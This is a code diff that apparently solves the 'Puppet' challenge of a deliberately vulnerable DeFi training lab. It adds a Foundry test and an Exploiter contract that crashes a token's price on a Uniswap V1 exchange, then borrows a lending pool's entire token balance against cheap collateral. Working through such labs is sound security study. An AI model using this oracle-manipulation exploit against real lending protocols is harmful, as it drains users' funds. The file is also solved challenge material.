@@ -119,7 +119,16 @@ contract Puppet is Test {
 
     function testExploit() public {
         /** EXPLOIT START **/
+	// perhaps we can just continously borrow -> sell, borrow more -> sell
+	// if the liquidity is low enough
 
+	// ETH -> DVT (dump price)
+	// borrow all the DVT (cheap)
+	vm.startPrank(attacker);
+	Exploiter exp = new Exploiter(puppetPool, uniswapExchange, dvt);
+	dvt.transfer(address(exp), dvt.balanceOf(attacker));
+	exp.exploit{value: 25 ether}();
+	vm.stopPrank();
         /** EXPLOIT END **/
         validation();
     }
@@ -141,4 +150,28 @@ contract Puppet is Test {
         uint256 denominator = (input_reserve * 1000) + input_amount_with_fee;
         return numerator / denominator;
     }
+}
+
+contract Exploiter {
+	PuppetPool pool;
+	UniswapV1Exchange exchange;
+	DamnValuableToken dvt;
+	constructor(PuppetPool _pool, UniswapV1Exchange _ex, DamnValuableToken _dvt) {
+		pool = _pool;
+		exchange = _ex;
+		dvt = _dvt;
+	}
+	
+	function exploit() public payable {
+		dvt.approve(address(exchange), type(uint).max);
+		exchange.tokenToEthSwapInput(
+			dvt.balanceOf(address(this)),
+			1,
+			10_000_000
+		);
+		pool.borrow{value: msg.value}(dvt.balanceOf(address(pool)));
+		dvt.transfer(msg.sender, dvt.balanceOf(address(this)));
+	}
+
+	receive() external payable {}
 }
